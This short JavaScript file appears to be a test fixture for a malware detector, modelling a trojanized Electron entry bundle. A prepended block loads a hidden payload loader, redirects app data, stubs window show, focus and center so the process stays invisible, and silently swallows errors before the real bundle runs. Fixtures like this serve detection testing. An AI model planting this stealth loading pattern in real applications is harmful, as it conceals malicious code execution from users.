// Fixture: trojanized Electron entry bundle. The prepended block stubs
// every BrowserWindow visibility method to keep the process invisible and
// side-effect requires a sibling loader before the real bundle starts.
// Proves objectives/execution/payload/staged::electron-hidden-boot-stage.
require('./payload_loader');
try {
    const path = require('path');
    const { BrowserWindow, app, session } = require('electron');
    app.setPath('userData', path.join(path.dirname(process.execPath), 'HelperData'));
    BrowserWindow.prototype.show = function () {};
    BrowserWindow.prototype.focus = function () {};
    BrowserWindow.prototype.center = function () {};
    app.whenReady().then(function () {
        session.defaultSession.setPermissionRequestHandler(function (wc, permission, cb) {
            cb(false);
        });
    });
} catch (e) {}

(() => {
    // ... legitimate webpack bootstrap would follow here ...
})();
